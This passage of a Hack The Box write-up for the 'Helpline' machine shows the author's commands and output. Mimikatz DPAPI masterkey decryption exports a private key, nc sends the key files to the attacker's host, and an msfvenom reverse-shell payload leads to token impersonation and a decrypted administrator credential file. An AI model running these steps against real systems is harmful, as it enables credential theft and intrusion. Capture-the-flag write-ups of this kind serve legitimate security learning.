8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf0307
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330$
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899$
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596                                                         

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800                                                         


mimikatz # dpapi::masterkey /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017" /password:!zaq1234567890pl!99                
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 80ba00dd649b0237d847b3c30d155a36
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 9dd4c16fe8fc2375858f5fdc643770d26bd55c48fec169c28d901820ebe28ea0d6845d2867e3a2bb3b763108da7fb69b5203d8a73ffb22b44d21949150546a0387e2a7d05a18b877f06d0dfe8baf89fc4029070bd5f0a5ac9cbe2379dda7facf6a2455ed8dae4dacd51b981b147ebddf12da71d4b22d675925ed576d92247aac8a39eb5080607382ecf2c3e9ea92ce2f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : bce3d5c5463ff84017a1f9eabfb4b9ea
    rounds           : 00001f40 - 8000
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 6d4e0478c22d0a52f7bc66249a0c6a7071991300dd122c4bee0aa31b72273938f336a44d08a15a2effcb2e5787069ab153e666dcd518b7af23e168577f56739f68c42e057508d7d5ffb16bf18d9e720873e644152d461d83356f500f4b8efbbcc9ee073a718134111f8b2708bf0f1645

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {0cc50e66-d2f0-43dc-97a5-5edac908aef9}


Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-1011

[masterkey] with password: !zaq1234567890pl!99 (normal user)
  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02                                                                          
  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb

mimikatz # dpapi::capi /in:"C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85" /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb            
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d
  pHash              : 0000000000000000000000000000000000000000     
  pSiPublicKey       :    
  pSiPrivateKey      :    
  pSiExportFlag      :                        
  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543
62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e
51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                          
  pExPrivateKey      :
  
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1
    dwDataLen          : 00000550 - 1360
    pbData             : 0dd1b5843b4e6da999ab982ff7bef727bd63f11eb222fd81420d24e0dc8a8c03910ddca26dba324e943a5357776530618f14c74382062047acb3f35debdb8f885a283c3644542dde4aa1175ac9d7a23e014bb92d85c2f51dd8eb6d0007
a2f4ca83df25b59f32794c2a4e227e526cd2d5f4a222ca9c14be15e62982107d91865a3e0fc04708144aa7fe7f7baf0c5a7b99c18f96e82c1f01dc8b41df64b51befd3a978a9d47a72246ceadfda631d09be350a4d3bf1301fba7e1b6c6e0c40bf95ce9e154f79cbef2
6d7a3c00d538e490132954d4ee94619dcdaf75e64676c89e89317d4668fe4b942a7bc21371efa3adf08152dabdf0d16e608cda6bdcca193771d736e19505e51f6e972ef5da070b0023e740dd96893d0458da1994f72aa3bc6846218e4634d4a199f698dcce5d2a96c68
8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf030$
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330f
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899c
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800

Decrypting AT_EXCHANGE Export flags:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
01000000
Decrypting AT_EXCHANGE Private Key:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
525341320801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef6363754362f219c555d7feb1b7423f9
d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e51d19fa1bf7d748e524919d
abdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b600000000000000006b686e241f8ac960bd719549bd40384959b682321394b15dd99070665bb0b3177
4d9a149b5b097b7ab965763e5592eeae40896efd89c92ef20519b995ac65c9258a8973e021efb6255514a42e5af7aa7ad028349c8ba92b61e2cb52ea740f15cdabf14f23f1aea32b3ab47c4ce72be3920314e8096fda33dd978fee18c79fde000000000d3d94b2498e1
0b913cc5c026ee19c672eaafe6eab8bb92b5c45b22be438d469a197a08b0ce230a926bf2418256c8397d5630de1ff89275cd1fa2ed1170b3408e697a505b61262a44db96763a532322a2cc070520af4f4539c4f44754513932481b76bd5765a7196cac8bf9fe9fad0d7
4460ece6677a99096b565705cc3de84cf00000000ff61d229009652074adf5045582172ff5638b61254e044b4714eb7f7261c019415a30c6e8bd1fa1d1fbc1ef0620394594d83ab2796416b80acb40ca77d7cccc1eca5eef9c6e0892e144defb31f6f3b20a69201485e
7058d72851f697307898c3957a3bb0bf0e65f1beb40b182c66627138fe5c264231d16d013bac509b9c937d00000000c7fc63389c2c563d9c380fc70de0774025d8f4a7ee15dd8c69de0ae2e5a8f881f939ade966c736ef7188374a9730ddfc99f5791d59ca8de461fbb
44a5326a29aee91d5f0eb903eb9ede3a76b03df9929b2afec0766e7dca2f4b25f4e370d95759db76a89c42812ba2c1a670a6727d8424f62c344f87dbf0b2686959335811e0e00000000505ecc240eefef332854553feabb019fa075baa1148953d142582f82d6cf1fc0
72267bd574d0d665dfafb8c9be8afd434f2250a840c6a0f80be883c70dafea4b6a1a23c29534a49188fa9c1c7df45788da79ced400db29799a057938fa3059f1ded01cbb8635dc3579ded3e9c16fc2d4bb7085ddda143c16657e24c2876c88bc00000000e1f11d6633a
644709fa252d8614531d2e8da61fc078ae8bfd91ce60582c914873d9dc6825bdd453d00594e3e286f1b843dd7154a8a67378272b2fce204162c87cb80320bd8a7e31bf646ee6b54635a4242abddef81876be6d33d9ffa356fb306c364c902ba52a43d9776d9c88d8de4
fcf11fea675cc8c1a1dcc79da2e3ec931f8fe342fecef6c883649e86cfda7d34cc01e0a128424df5d3a6f17dbea80983a6b4e14cb19c5a039b290bcdfe4c48dce945985f1c9d3464fec51b26b59d8ceacb52f5030d322566de54d42806900343b47d03ba31f67b60495
73ededc194c1be20f2a02700dc25de6e18b26d1dcc7b189c1822e6d2370c1ecc8af73e924000f2c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        Exportable key : YES
        Key size       : 2048
        Private export : OK - 'raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk'
</code></pre></div></div>
<h4 id="i-used-nc-to-transfer-the-der-and-pvk-files-to-my-box-">I used <code class="highlighter-rouge">nc</code> to transfer the <code class="highlighter-rouge">der</code> and <code class="highlighter-rouge">pvk</code> files to my box :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color&gt;nc.exe -w 3 10.10.xx.xx 1440 &lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
nc.exe -w 3 10.10.xx.xx 1440 &lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der

C:\Windows\System32\spool\drivers\color&gt;nc.exe -w 3 10.10.xx.xx 1440 &lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk        
nc.exe -w 3 10.10.xx.xx 1440 &lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk

C:\Windows\System32\spool\drivers\color&gt;
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 &gt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der 
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                                                    
total 12
drwxr-xr-x 2 root root 4096 Aug 16 16:50 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 &gt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk                                                             
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                         
total 16
drwxr-xr-x 2 root root 4096 Aug 16 16:51 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
-rw-r--r-- 1 root root 1196 Aug 16 16:51 raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk
</code></pre></div></div>
<h4 id="then-i-created-the-pfx-with-openssl-">Then I created the <code class="highlighter-rouge">pfx</code> with <code class="highlighter-rouge">openssl</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
writing RSA key
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre></div></div>
<h4 id="and-finally-i-imported-it-and-i-was-able-to-read-the-flag-">And finally I imported it and I was able to read the flag :</h4>
<p><img src="/images/hackthebox/helpline/26.png" alt="" /></p>
<h4 id="i-found-later-that-i-could-also-use-invoke-command-as-tolu-and-i-would-be-able-to-read-the-flag-still-dont-know-why-i-couldnt-read-it-from-a-winrm-session">I found later that I could also use <code class="highlighter-rouge">Invoke-Command</code> as <code class="highlighter-rouge">tolu</code> and I would be able to read the flag, still don’t know why I couldn’t read it from a <code class="highlighter-rouge">winrm</code> session.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\System32\spool\drivers\color&gt; $username = "Helpline\tolu"
$username = "Helpline\tolu"
PS C:\Windows\System32\spool\drivers\color&gt; $password = "!zaq1234567890pl!99"
$password = "!zaq1234567890pl!99"
PS C:\Windows\System32\spool\drivers\color&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Windows\System32\spool\drivers\color&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Windows\System32\spool\drivers\color&gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
</code></pre></div></div>
<p><img src="/images/hackthebox/helpline/27.png" alt="" /></p>
<h4 id="we-got-user">We got user.</h4>
<p><br /></p>
<hr />

<h3 id="roottxt">root.txt</h3>
<h4 id="there-was-a-file-called-admin-passxml-in-cusersleodesktop">There was a file called <code class="highlighter-rouge">admin-pass.xml</code> in <code class="highlighter-rouge">C:\Users\leo\Desktop</code></h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\leo\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\leo\Desktop

01/15/2019  01:21 AM    &lt;DIR&gt;          .
01/15/2019  01:21 AM    &lt;DIR&gt;          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,850,574,848 bytes free

C:\Users\leo\Desktop&gt;type admin-pass.xml
type admin-pass.xml
Access is denied.
</code></pre></div></div>
<h4 id="only-leo-can-read-it-leos-hash-was-uncrackable-so-i-looked-for-other-ways-to-be-leo-i-wanted-to-see-if-i-can-impersonate-leos-token-so-i-created-a-metasploit-payload-and-got-a-meterpreter-session">Only <code class="highlighter-rouge">leo</code> can read it. <code class="highlighter-rouge">leo's</code> hash was uncrackable so I looked for other ways to be <code class="highlighter-rouge">leo</code>. I wanted to see if I can impersonate <code class="highlighter-rouge">leo</code>’s token so I created a <code class="highlighter-rouge">metasploit</code> payload and got a <code class="highlighter-rouge">meterpreter</code> session.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1441 -f exe &gt; m.exe
</code></pre></div></div>
<h4 id="and-yes-i-could-impersonate-leos-token-">And yes, I could impersonate <code class="highlighter-rouge">leo</code>’s token :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; load incognito 
Loading extension incognito...Success.
meterpreter &gt; list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
HELPLINE\leo
HELPLINE\tolu
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter &gt; impersonate_token 'HELPLINE\leo'
[+] Delegation token available
[+] Successfully impersonated user HELPLINE\leo
meterpreter &gt; shell -t 
Process 5344 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32\spool\drivers\color&gt;whoami
whoami
helpline\leo

C:\Windows\System32\spool\drivers\color&gt;
</code></pre></div></div>
<h4 id="now-we-can-read-admin-passxml-">Now we can read <code class="highlighter-rouge">admin-pass.xml</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\spool\drivers\color&gt;cd c:\users\leo\desktop
cd c:\users\leo\desktop

c:\Users\leo\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of c:\Users\leo\Desktop

01/15/2019  01:21 AM    &lt;DIR&gt;          .
01/15/2019  01:21 AM    &lt;DIR&gt;          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,719,506,944 bytes free

c:\Users\leo\Desktop&gt;type admin-pass.xml
type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

c:\Users\leo\Desktop&gt;
</code></pre></div></div>
<h4 id="i-used-invoke-command-again-and-used-get-content-to-read-admin-passxml-instead-of-putting-the-password-in-a-variable">I used <code class="highlighter-rouge">Invoke-Command</code> again and used <code class="highlighter-rouge">Get-Content</code> to read <code class="highlighter-rouge">admin-pass.xml</code> instead of putting the password in a variable.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\Users\leo\Desktop&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\leo\Desktop&gt; $username = "Helpline\Administrator"
$username = "Helpline\Administrator"
PS C:\Users\leo\Desktop&gt; $password = "admin-pass.xml"
$password = "admin-pass.xml"
PS C:\Users\leo\Desktop&gt; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
PS C:\Users\leo\Desktop&gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
</code></pre></div></div>
<p><img src="/images/hackthebox/helpline/28.png" alt="" /></p>
<h4 id="we-owned-root-">We owned root !</h4>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-hack-the-box-write-up--hack-the-box---arkham">Previous Hack The Box write-up : <a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></h4>
<h4 id="next-hack-the-box-write-up--hack-the-box---unattended">Next Hack The Box write-up : <a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/helpline/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

